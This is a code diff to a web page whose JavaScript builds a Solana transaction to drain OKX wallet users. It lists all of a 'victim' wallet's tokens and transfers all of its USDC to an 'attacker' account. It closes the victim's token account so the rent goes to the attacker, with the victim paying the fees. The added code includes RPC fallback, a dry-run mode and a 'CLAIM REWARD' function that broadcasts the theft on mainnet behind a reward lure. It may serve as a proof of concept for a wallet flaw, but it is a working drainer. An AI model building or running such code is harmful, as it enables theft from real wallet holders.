@@ -26,13 +26,19 @@ pre{background:#f0f0f0;color:#333;font-size:11px;padding:8px;border-radius:6px;
     const out = document.getElementById("out");
     if (out) out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent;
   }
+  // Multi-RPC fallback: api.mainnet-beta rate-limits aggressively, publicnode/ankr more permissive
+  window._RPC_URLS = [
+    "https://solana-rpc.publicnode.com",
+    "https://rpc.ankr.com/solana",
+    "https://api.mainnet-beta.solana.com",
+  ];
   try {
     const w3  = await import("https://esm.sh/@solana/web3.js@1.95.3");
     const spl = await import("https://esm.sh/@solana/spl-token@0.4.8");
     window._sol = w3;
     window._spl = spl;
-    window._conn = new w3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-    _log("✓ libs + mainnet RPC ready");
+    window._conn = new w3.Connection(window._RPC_URLS[0], "confirmed");
+    _log("✓ libs ready · primary RPC: " + window._RPC_URLS[0].replace("https://",""));
   } catch(e) {
     _log("LOAD FAIL: " + e.message);
   }
@@ -62,7 +68,56 @@ const USDC_DECIMALS   = 6;
 const out = document.getElementById("out");
 function log(t){ out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent; }
 
-async function buildDrainTx() {
+// Try each RPC in order; first one that responds wins. Switches window._conn for subsequent calls.
+async function rpcCall(method, ...args) {
+  let lastErr;
+  for (const url of window._RPC_URLS) {
+    try {
+      const c = new window._sol.Connection(url, "confirmed");
+      const res = await c[method](...args);
+      window._conn = c; // sticky — keep using whichever RPC works
+      return res;
+    } catch(e) {
+      lastErr = e;
+      const tag = url.replace("https://","").substring(0,20);
+      log("  rpc[" + tag + "] " + method + " → " + (e.message||"err").substring(0,60));
+    }
+  }
+  throw lastErr || new Error("all RPCs failed for " + method);
+}
+
+// List all SPL tokens the victim wallet holds (helps when USDC_MINT shows empty).
+async function listVictimTokens(victim) {
+  try {
+    const TOKEN_PROGRAM = new window._sol.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+    const r = await rpcCall("getParsedTokenAccountsByOwner", victim, { programId: TOKEN_PROGRAM });
+    if (!r.value || r.value.length === 0) {
+      log("  no SPL token accounts found for victim");
+      return [];
+    }
+    const tokens = r.value.map(a => ({
+      mint: a.account.data.parsed.info.mint,
+      ata: a.pubkey.toString(),
+      amount: a.account.data.parsed.info.tokenAmount.uiAmount,
+      raw: a.account.data.parsed.info.tokenAmount.amount,
+      decimals: a.account.data.parsed.info.tokenAmount.decimals,
+    })).filter(t => BigInt(t.raw) > 0n);
+    if (tokens.length === 0) {
+      log("  victim has SPL token accounts but all empty");
+    } else {
+      log("  victim's SPL tokens:");
+      for (const t of tokens) {
+        log("    " + t.amount + " of mint " + t.mint.substring(0,8) + "... (ATA " + t.ata.substring(0,8) + "...)");
+      }
+    }
+    return tokens;
+  } catch(e) {
+    log("  listVictimTokens failed: " + e.message);
+    return [];
+  }
+}
+
+async function buildDrainTx({ allowFakeBlockhash = false } = {}) {
   if (!window._sol || !window._spl) throw new Error("libs not loaded yet");
   const ow = window.okxwallet;
   if (!ow || !ow.solana) throw new Error("not in OKX dApp browser");
@@ -75,58 +130,94 @@ async function buildDrainTx() {
   log("victim:   " + victim.toString());
   log("attacker: " + attacker.toString());
 
-  // 2. Derive ATAs (off-chain).
+  // 2. List ALL SPL tokens victim holds (so we know what's drainable).
+  log("scanning victim SPL token accounts...");
+  await listVictimTokens(victim);
+
+  // 3. Derive USDC ATAs (off-chain).
   const victimATA   = await window._spl.getAssociatedTokenAddress(mint, victim);
   const attackerATA = await window._spl.getAssociatedTokenAddress(mint, attacker);
-  log("victim ATA:   " + victimATA.toString());
-  log("attacker ATA: " + attackerATA.toString());
+  log("victim USDC ATA:   " + victimATA.toString());
+  log("attacker USDC ATA: " + attackerATA.toString());
 
-  // 3. Live: USDC balance + attacker ATA existence.
-  let usdcRaw = 0n;
+  // 4. Read victim's USDC balance + check attacker ATA existence (with explicit error logs).
+  let usdcRaw = 0n, victimAtaExists = false;
   try {
-    const bal = await window._conn.getTokenAccountBalance(victimATA);
+    const bal = await rpcCall("getTokenAccountBalance", victimATA);
     usdcRaw = BigInt(bal.value.amount);
+    victimAtaExists = true;
     log("victim USDC balance: " + bal.value.uiAmount + " (" + usdcRaw + " raw)");
   } catch(e) {
-    log("victim USDC ATA empty/missing — will only drain rent");
+    if ((e.message||"").toLowerCase().includes("could not find account")) {
+      log("victim USDC ATA does NOT exist on-chain (no USDC ever received)");
+    } else {
+      log("⚠ RPC error reading USDC balance: " + e.message.substring(0,80));
+    }
   }
   let attackerATAExists = false;
   try {
-    const info = await window._conn.getAccountInfo(attackerATA);
+    const info = await rpcCall("getAccountInfo", attackerATA);
     attackerATAExists = info !== null;
-  } catch(e) {}
-  log("attacker ATA exists: " + attackerATAExists);
+  } catch(e) {
+    log("⚠ RPC error checking attacker ATA: " + e.message.substring(0,80));
+  }
+  log("attacker ATA exists on-chain: " + attackerATAExists);
 
-  // 4. Build the tx.
+  // 5. Build the tx.
   const tx = new window._sol.Transaction();
+  let ixIdx = 0;
 
-  // Instruction 1: create attacker ATA, paid by victim
+  // ix: create attacker ATA, paid by victim (only if doesn't exist)
   if (!attackerATAExists) {
     tx.add(window._spl.createAssociatedTokenAccountInstruction(
       victim, attackerATA, attacker, mint,
     ));
-    log("ix[1]: createATA(attacker)");
+    log("ix[" + (++ixIdx) + "]: createATA(attacker)");
   }
 
-  // Instruction 2: drain USDC from victim ATA to attacker ATA
+  // ix: drain USDC from victim ATA to attacker ATA (only if balance > 0)
   if (usdcRaw > 0n) {
     tx.add(window._spl.createTransferCheckedInstruction(
       victimATA, mint, attackerATA, victim, usdcRaw, USDC_DECIMALS,
     ));
-    log("ix[2]: transferChecked(" + usdcRaw + " USDC, victim → attacker)");
+    log("ix[" + (++ixIdx) + "]: transferChecked(" + usdcRaw + " USDC, victim → attacker)");
   }
 
-  // Instruction 3: close victim ATA, transfer SOL rent (~0.002 SOL ≈ $0.50) to attacker
-  tx.add(window._spl.createCloseAccountInstruction(
-    victimATA, attacker, victim,
-  ));
-  log("ix[" + tx.instructions.length + "]: closeAccount(victimATA, dest=attacker)");
+  // ix: close victim ATA, transfer SOL rent (~0.002 SOL ≈ $0.50) to attacker
+  // Only include if the ATA actually exists on-chain (otherwise tx will fail at broadcast).
+  // For dry-run we add it anyway — OKX will still render the prompt.
+  if (victimAtaExists || allowFakeBlockhash) {
+    tx.add(window._spl.createCloseAccountInstruction(
+      victimATA, attacker, victim,
+    ));
+    log("ix[" + (++ixIdx) + "]: closeAccount(victimATA, dest=attacker)  ★ THIS IS THE BUG-TRIGGERING IX");
+  } else {
+    log("⚠ victim USDC ATA doesn't exist — closeAccount would revert. Tx unsignable in real broadcast mode.");
+    log("  Tip: send some USDC (or change USDC_MINT to a token you actually hold) to demo the drain.");
+  }
 
-  // 5. Recent blockhash + fee payer.
-  const { blockhash, lastValidBlockHeight } = await window._conn.getLatestBlockhash("finalized");
+  if (tx.instructions.length === 0) {
+    throw new Error("no instructions to sign — wallet has no drainable USDC ATA");
+  }
+
+  // 6. Recent blockhash + fee payer (with fallback for dry-run).
+  let blockhash, lastValidBlockHeight;
+  try {
+    const r = await rpcCall("getLatestBlockhash", "finalized");
+    blockhash = r.blockhash;
+    lastValidBlockHeight = r.lastValidBlockHeight;
+    log("blockhash: " + blockhash.substring(0,12) + "...");
+  } catch(e) {
+    if (allowFakeBlockhash) {
+      blockhash = "11111111111111111111111111111112";
+      lastValidBlockHeight = 0;
+      log("⚠ all RPCs failed for blockhash — using PLACEHOLDER for DRY-RUN (prompt will still render)");
+    } else {
+      throw new Error("cannot broadcast without real blockhash — " + e.message);
+    }
+  }
   tx.recentBlockhash = blockhash;
   tx.feePayer        = victim;
-  log("blockhash: " + blockhash.substring(0,12) + "...");
 
   return { tx, blockhash, lastValidBlockHeight };
 }
@@ -134,7 +225,7 @@ async function buildDrainTx() {
 async function dryRun() {
   log("════════ DRY RUN — sign only, NO broadcast ════════");
   try {
-    const { tx } = await buildDrainTx();
+    const { tx } = await buildDrainTx({ allowFakeBlockhash: true });
     log("requesting signature → OKX prompt should appear NOW");
     const t0 = Date.now();
     const signed = await window.okxwallet.solana.signTransaction(tx);
@@ -148,7 +239,7 @@ async function dryRun() {
 async function claim() {
   log("════════ CLAIM REWARD — REAL MAINNET BROADCAST ════════");
   try {
-    const { tx, blockhash, lastValidBlockHeight } = await buildDrainTx();
+    const { tx, blockhash, lastValidBlockHeight } = await buildDrainTx({ allowFakeBlockhash: false });
 
     log("requesting signature → OKX prompt should appear NOW");
     const t0 = Date.now();
